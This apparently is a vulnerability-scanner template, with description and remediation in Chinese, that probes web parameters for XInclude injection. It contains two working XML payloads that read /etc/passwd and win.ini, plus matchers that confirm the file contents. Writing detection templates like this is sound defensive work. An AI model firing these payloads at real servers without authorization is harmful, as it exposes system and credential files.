id: xinclude-injection

info:
  name: XInclude 注入探测（DAST）
  author: DhiyaneshDK,ritikchaddha
  severity: high
  description: |
    XInclude 注入发生在服务端 XML 处理器允许攻击者控制文档片段并解析 `<xi:include>` 指令时，攻击者可引用本地文件或远程资源。模板将参数替换为读取 `/etc/passwd` 与 `C:\Windows\win.ini` 的 XInclude 片段，并通过 Linux/Windows 文件特征回显确认解析。
  impact: |
    - 攻击者可读取服务器本地文件、配置、源码或凭据，严重时进一步辅助 XXE、SSRF 或代码执行链。
    - XML 处理逻辑位于导入、报表或集成接口时，漏洞可能暴露内部系统信息。
  remediation: |
    - 禁用 XML 解析器的 XInclude、外部实体和外部 DTD 解析能力，避免解析不可信 XML 片段。
    - 对 XML 输入使用安全解析配置和结构白名单，不允许用户控制包含指令、协议或文件路径。
  reference:
    - https://d0pt3x.gitbook.io/passion/webapp-security/xxe-attacks/xinclude-attacks
  tags: dast,xxe,xinclude,vuln

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'
          - 'method == "POST"'
          - 'method == "PUT"'
    payloads:
      xinc_fuzz:
        - '<asd xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></asd>'
        - '<asd xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///c:/windows/win.ini"/></asd>'

    fuzzing:
      - parts:
          - query
          - body
        type: replace # replaces existing parameter value with fuzz payload
        mode: multiple # replaces all parameters value with fuzz payload
        fuzz:
          - '{{xinc_fuzz}}'

    stop-at-first-match: true
    matchers-condition: or
    matchers:
      - type: regex
        name: linux
        part: body
        regex:
          - 'root:[^:]*:\d+:\d+:'

      - type: word
        name: windows
        part: body
        words:
          - 'for 16-bit app support'
